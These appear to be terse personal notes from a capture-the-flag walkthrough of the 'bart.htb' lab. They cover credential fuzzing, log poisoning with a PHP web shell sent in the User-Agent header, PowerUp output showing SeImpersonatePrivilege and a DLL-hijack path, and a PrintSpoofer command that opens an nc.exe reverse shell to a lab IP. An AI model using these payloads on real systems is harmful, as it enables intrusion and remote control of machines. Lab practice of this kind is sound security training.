in http://bart.htb/monitor/
we use username anarchy to create user list, cupp to create pass list and zaproxy to fuzzing login page
we get credentials harvey:potter 
[all my records were deleted by the antivirus( ]

we found subdomain internal-01.bart.htb
after fuzzing we found log/log.txt /log/log.php files
in log.txt we get harvey username

so we generate payload to our get request in log.php
need to give it its proper look obsidian is blocking my entries and deleting the file so I can't add it <? ?> in user agent

GET /log/log.php?filename=log.php&username=harvey&cmd=dir HTTP/1.1
Host: internal-01.bart.htb
User-Agent: php system($_REQUEST['cmd']); 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=hc1a7neimsefpcbpqqp2kqn7kv
Upgrade-Insecure-Requests: 1
Priority: u=0, i

PowerUp result:
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 912
ProcessId   : 5248
Name        : 5248
Check       : Process Token Privileges

ModifiablePath    : C:\ProgramData\ComposerSetup\bin
IdentityReference : BUILTIN\Users
Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
%PATH%            : C:\ProgramData\ComposerSetup\bin
Name              : C:\ProgramData\ComposerSetup\bin
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 
                    'C:\ProgramData\ComposerSetup\bin\wlbsctrl.dll'

we can use get-registryautologon its function powerup and also escalate privilege with seimpersonate
./PrintSpoofer.exe -c "C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.14 9002 -e cmd"
